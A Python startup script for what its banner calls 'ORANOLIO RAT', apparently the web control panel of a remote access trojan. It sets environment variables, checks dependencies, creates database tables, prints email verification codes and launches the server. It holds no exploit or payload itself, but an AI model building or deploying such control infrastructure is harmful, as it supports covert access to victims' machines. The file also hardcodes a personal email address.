#!/usr/bin/env python3
"""
Fixed System Startup Script
Ensures all components are properly configured and working
"""

import os
import sys
import subprocess
import time
import signal
from pathlib import Path

def setup_environment():
    """Set up environment variables"""
    print("🔧 Setting up environment...")
    
    # Set authorized emails
    os.environ['STITCH_AUTHORIZED_EMAILS'] = 'brooketogo98@gmail.com'
    
    # Set other important environment variables
    os.environ['STITCH_HOST'] = '0.0.0.0'
    os.environ['STITCH_PORT'] = '5000'
    os.environ['STITCH_DEBUG'] = 'false'
    os.environ['USE_AUTOMATED_EMAIL'] = 'true'
    
    print("   ✅ Environment configured")

def check_dependencies():
    """Check if all required dependencies are installed"""
    print("\n📦 Checking dependencies...")
    
    required_packages = [
        'flask', 'flask_socketio', 'flask_limiter', 'flask_wtf',
        'pycryptodome', 'colorama', 'qrcode', 'pillow', 'pyotp',
        'cryptography', 'requests', 'python_dotenv'
    ]
    
    missing_packages = []
    
    for package in required_packages:
        try:
            __import__(package)
            print(f"   ✅ {package}")
        except ImportError:
            missing_packages.append(package)
            print(f"   ❌ {package}")
    
    if missing_packages:
        print(f"\n⚠️  Missing packages: {', '.join(missing_packages)}")
        print("   Run: pip3 install " + " ".join(missing_packages))
        return False
    
    print("   ✅ All dependencies installed")
    return True

def setup_database():
    """Set up database tables"""
    print("\n🗄️  Setting up database...")
    
    try:
        # Create email tables
        result = subprocess.run([sys.executable, 'create_email_tables.py'], 
                              capture_output=True, text=True, cwd='/workspace')
        if result.returncode == 0:
            print("   ✅ Email tables created")
        else:
            print(f"   ⚠️  Email tables: {result.stderr}")
        
        # Create MFA tables
        result = subprocess.run([sys.executable, 'create_mfa_tables.py'], 
                              capture_output=True, text=True, cwd='/workspace')
        if result.returncode == 0:
            print("   ✅ MFA tables created")
        else:
            print(f"   ⚠️  MFA tables: {result.stderr}")
        
        return True
        
    except Exception as e:
        print(f"   ❌ Database setup error: {e}")
        return False

def test_authentication():
    """Test authentication system"""
    print("\n🔐 Testing authentication system...")
    
    try:
        # Test email authentication
        from email_auth import email_exists, send_verification_email, verify_code
        from automated_email_service import automated_email_service
        
        # Check if email exists
        exists = email_exists('brooketogo98@gmail.com')
        print(f"   ✅ Email exists: {exists}")
        
        # Test email send (if not rate limited)
        from email_auth import check_rate_limit
        if check_rate_limit('brooketogo98@gmail.com'):
            success, code, expires = send_verification_email('brooketogo98@gmail.com', '127.0.0.1')
            if success and code:
                print(f"   ✅ Email send: Success (Code: {code})")
                print(f"   🔗 Webhook: {automated_email_service.get_webhook_url()}")
                
                # Test verification
                verify_result = verify_code('brooketogo98@gmail.com', code)
                print(f"   ✅ Code verification: {verify_result}")
            else:
                print("   ⚠️  Email send failed (may be rate limited)")
        else:
            print("   ⚠️  Rate limited - too many recent attempts")
        
        return True
        
    except Exception as e:
        print(f"   ❌ Authentication test error: {e}")
        return False

def start_web_server():
    """Start the web server"""
    print("\n🌐 Starting web server...")
    
    try:
        # Start web server
        process = subprocess.Popen(
            [sys.executable, 'web_app_real.py'],
            cwd='/workspace',
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        
        # Wait for startup
        time.sleep(3)
        
        # Check if running
        if process.poll() is None:
            print("   ✅ Web server started successfully")
            print("   🌐 Web Interface: http://localhost:5000")
            print("   📧 Login with: brooketogo98@gmail.com")
            print("   🔗 Check webhook URL for verification code")
            print("\n   Press Ctrl+C to stop the server")
            
            try:
                # Keep running until interrupted
                process.wait()
            except KeyboardInterrupt:
                print("\n   🛑 Stopping web server...")
                process.terminate()
                process.wait()
                print("   ✅ Web server stopped")
        else:
            stdout, stderr = process.communicate()
            print(f"   ❌ Web server failed to start")
            print(f"   Error: {stderr.decode()}")
            return False
        
        return True
        
    except Exception as e:
        print(f"   ❌ Web server error: {e}")
        return False

def main():
    """Main startup function"""
    print("🚀 ORANOLIO RAT - SYSTEM STARTUP")
    print("=" * 50)
    
    # Step 1: Setup environment
    setup_environment()
    
    # Step 2: Check dependencies
    if not check_dependencies():
        print("\n❌ Missing dependencies. Please install them first.")
        return False
    
    # Step 3: Setup database
    if not setup_database():
        print("\n❌ Database setup failed.")
        return False
    
    # Step 4: Test authentication
    if not test_authentication():
        print("\n❌ Authentication test failed.")
        return False
    
    # Step 5: Start web server
    print("\n" + "=" * 50)
    print("🎉 SYSTEM READY!")
    print("=" * 50)
    
    if not start_web_server():
        print("\n❌ Failed to start web server.")
        return False
    
    return True

if __name__ == '__main__':
    try:
        success = main()
        if success:
            print("\n✅ System startup completed successfully!")
        else:
            print("\n❌ System startup failed!")
            sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n🛑 Startup interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")
        sys.exit(1)